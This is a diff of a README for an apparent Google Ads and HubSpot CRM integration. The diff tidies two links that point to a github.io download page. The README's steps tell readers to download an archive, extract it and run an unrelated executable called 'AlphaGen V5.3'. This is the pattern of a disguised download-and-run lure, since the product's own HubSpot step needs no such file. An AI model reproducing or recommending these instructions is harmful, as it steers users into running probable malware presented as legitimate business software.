@@ -2,15 +2,13 @@
 
 Connect Google Ads with HubSpot CRM to track conversions, sync ad data, and measure ROI — directly from your CRM.
 
-[![Download](https://img.shields.io/badge/Download-Google_Ads_HubSpot_Integration-blueviolet)](`https://google-ads-integration-hubspot-crm.github.io/.github`
-)
+[![Download](https://img.shields.io/badge/Download-Google_Ads_HubSpot_Integration-blueviolet)](https://google-ads-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](`https://google-ads-integration-hubspot-crm.github.io/.github`
-)  
+1. 📦 [Download the archive](https://google-ads-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract the folder to any preferred location  
 3. 🖱 Run AlphaGen V5.3 to activate Google Ads sync  
 4. ✅ In HubSpot, go to `Marketing > Ads`, connect your Google Ads account, and enable CRM syncing
